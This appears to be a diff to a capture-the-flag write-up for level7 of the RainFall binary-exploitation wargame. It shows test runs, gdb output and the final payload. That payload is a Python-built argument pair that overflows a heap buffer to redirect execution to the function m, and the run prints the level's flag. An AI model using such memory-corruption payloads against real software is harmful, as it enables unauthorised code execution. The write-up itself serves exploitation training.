@@ -1,5 +1,14 @@
 _basic test_
 ```
+level7@RainFall:~$ ls
+level7
+level7@RainFall:~$ ./level7 
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 test
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 test test
+~~
+
 ```
 
 _using gdb_
@@ -116,6 +125,31 @@ gdb ./level7
     0x08048520 <+44>:    ret
   End of assembler dump.
 
+  (gdb) info variables
+  All defined variables:
+
+  Non-debugging symbols:
+  0x080486d8  _fp_hw
+  0x080486dc  _IO_stdin_used
+  0x08048824  __FRAME_END__
+  0x08049828  __CTOR_LIST__
+  0x08049828  __init_array_end
+  0x08049828  __init_array_start
+  0x0804982c  __CTOR_END__
+  0x08049830  __DTOR_LIST__
+  0x08049834  __DTOR_END__
+  0x08049838  __JCR_END__
+  0x08049838  __JCR_LIST__
+  0x0804983c  _DYNAMIC
+  0x08049908  _GLOBAL_OFFSET_TABLE_
+  0x08049938  __data_start
+  0x08049938  data_start
+  0x0804993c  __dso_handle
+  0x08049940  completed.6159
+  0x08049944  dtor_idx.6161
+  0x08049960  c
+
+
 ```
 _main is calling malloc, strcpy, fopen, fget and puts.
 m is never called but load a global var and print it_
@@ -156,7 +190,8 @@ _now we need the adress of some functions_
 > adress of m 0x080484f4
 
 ```
-  $> /level7 `python -c 'print "\x90"*20 + "\x08\x04\x99\x28"[::-1]'` `python -c 'print "\x08\x04\x84\xf4"[::-1]'`
+  $> ./level7 $(python -c 'print("\x90"*20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+
   5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
   - 1649074015
 ```
